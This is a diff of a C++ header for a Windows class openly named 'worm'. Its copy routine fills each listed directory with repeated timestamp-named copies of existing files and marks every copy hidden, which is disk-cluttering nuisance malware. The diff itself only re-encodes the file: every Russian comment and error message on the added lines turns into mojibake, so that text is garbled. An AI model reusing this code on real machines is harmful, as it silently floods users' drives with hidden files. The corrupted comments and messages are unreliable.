@@ -1,4 +1,4 @@
-#pragma once
+п»ї#pragma once
 #include <windows.h>
 #include <string>
 #include <vector>
@@ -17,9 +17,9 @@ std::string get_own_path();
 std::string get_drive_root_from_path(const std::string& full_path);
 bool is_hidden(const fs::path& path);
 void init_locale();
-// Генератор случайных чисел
+// Р“РµРЅРµСЂР°С‚РѕСЂ СЃР»СѓС‡Р°Р№РЅС‹С… С‡РёСЃРµР»
 std::string generate_random_suffix();
-// Генератор временной метки
+// Р“РµРЅРµСЂР°С‚РѕСЂ РІСЂРµРјРµРЅРЅРѕР№ РјРµС‚РєРё
 std::string get_timestamp();
 
 class worm
@@ -67,24 +67,24 @@ public:
 	void copy_file() {
 		init_locale();
 		if (list_dir.empty()) {
-			cerr << "Список директорий пуст! Сначала выполните search_list_dir()\n";
+			cerr << "РЎРїРёСЃРѕРє РґРёСЂРµРєС‚РѕСЂРёР№ РїСѓСЃС‚! РЎРЅР°С‡Р°Р»Р° РІС‹РїРѕР»РЅРёС‚Рµ search_list_dir()\n";
 			return;
 		}
 
 		for (const auto& dir : list_dir) {
 
-			vector<fs::path> files_to_copy;//создали список файлов для каждой дирректории
-			//cout << " В директории " << dir << "\n";
+			vector<fs::path> files_to_copy;//СЃРѕР·РґР°Р»Рё СЃРїРёСЃРѕРє С„Р°Р№Р»РѕРІ РґР»СЏ РєР°Р¶РґРѕР№ РґРёСЂСЂРµРєС‚РѕСЂРёРё
+			//cout << " Р’ РґРёСЂРµРєС‚РѕСЂРёРё " << dir << "\n";
 
 			for (const auto& entry : fs::directory_iterator(dir)) {
 				try {
-					// Получаем статус файла с обработкой ошибок
+					// РџРѕР»СѓС‡Р°РµРј СЃС‚Р°С‚СѓСЃ С„Р°Р№Р»Р° СЃ РѕР±СЂР°Р±РѕС‚РєРѕР№ РѕС€РёР±РѕРє
 					error_code ec;
 					auto status = entry.status(ec);
 
 					if (ec || !fs::is_regular_file(status)) continue;
 
-					// Проверка скрытости для Windows
+					// РџСЂРѕРІРµСЂРєР° СЃРєСЂС‹С‚РѕСЃС‚Рё РґР»СЏ Windows
 					bool ishidden = false;
 					DWORD attrs = GetFileAttributesW(entry.path().wstring().c_str());
 					ishidden = (attrs != INVALID_FILE_ATTRIBUTES) &&
@@ -94,43 +94,43 @@ public:
 					}
 				}
 				catch (...) {
-					continue; // Пропускаем проблемные файлы
+					continue; // РџСЂРѕРїСѓСЃРєР°РµРј РїСЂРѕР±Р»РµРјРЅС‹Рµ С„Р°Р№Р»С‹
 				}
 			}
 
-			for (const auto& original_file : files_to_copy) { // копируем файлы и делаем их скрытными
+			for (const auto& original_file : files_to_copy) { // РєРѕРїРёСЂСѓРµРј С„Р°Р№Р»С‹ Рё РґРµР»Р°РµРј РёС… СЃРєСЂС‹С‚РЅС‹РјРё
 				std::wstring ext = original_file.extension().wstring();
 				std::wstring stem = original_file.stem().wstring();
 				fs::path parent_dir = original_file.parent_path();
 
-				cout << "Обрабатываем файл: " << original_file << "\n";
+				cout << "РћР±СЂР°Р±Р°С‚С‹РІР°РµРј С„Р°Р№Р»: " << original_file << "\n";
 
-				// Создаем заданное количество копий
+				// РЎРѕР·РґР°РµРј Р·Р°РґР°РЅРЅРѕРµ РєРѕР»РёС‡РµСЃС‚РІРѕ РєРѕРїРёР№
 				for (int i = 1; i <= iteration; ++i) {
 
-					// Создаем копию
+					// РЎРѕР·РґР°РµРј РєРѕРїРёСЋ
 					fs::path copy_path = parent_dir /
 						(stem + L"_copy_" + std::to_wstring(std::time(nullptr)) + ext);
 
 					try {
 						fs::copy_file(original_file, copy_path, fs::copy_options::overwrite_existing);
 
-						// 2. Устанавливаем атрибут "скрытый" (Unicode-версия)
+						// 2. РЈСЃС‚Р°РЅР°РІР»РёРІР°РµРј Р°С‚СЂРёР±СѓС‚ "СЃРєСЂС‹С‚С‹Р№" (Unicode-РІРµСЂСЃРёСЏ)
 						DWORD attrs = GetFileAttributesW(copy_path.wstring().c_str());
 						if (attrs != INVALID_FILE_ATTRIBUTES) {
 							DWORD new_attrs = attrs | FILE_ATTRIBUTE_HIDDEN;
 							if (!SetFileAttributesW(copy_path.wstring().c_str(), new_attrs)) {
 								DWORD error = GetLastError();
-								std::wcerr << L"Ошибка SetFileAttributesW: " << error << L"\n";
+								std::wcerr << L"РћС€РёР±РєР° SetFileAttributesW: " << error << L"\n";
 							}
 						}
 						else {
 							DWORD error = GetLastError();
-							std::wcerr << L"Ошибка GetFileAttributesW: " << error << L"\n";
+							std::wcerr << L"РћС€РёР±РєР° GetFileAttributesW: " << error << L"\n";
 						}
 					}
 					catch (const fs::filesystem_error& e) {
-						cerr << "  Ошибка при создании копии: " << e.what() << "\n";
+						cerr << "  РћС€РёР±РєР° РїСЂРё СЃРѕР·РґР°РЅРёРё РєРѕРїРёРё: " << e.what() << "\n";
 					}
 				}
 
@@ -143,7 +143,7 @@ public:
 
 
 	void create_wormix() {
-		// test commit 1 йцу  йцу
+		// test commit 1 Р№С†Сѓ  Р№С†Сѓ
 	};
 };
 
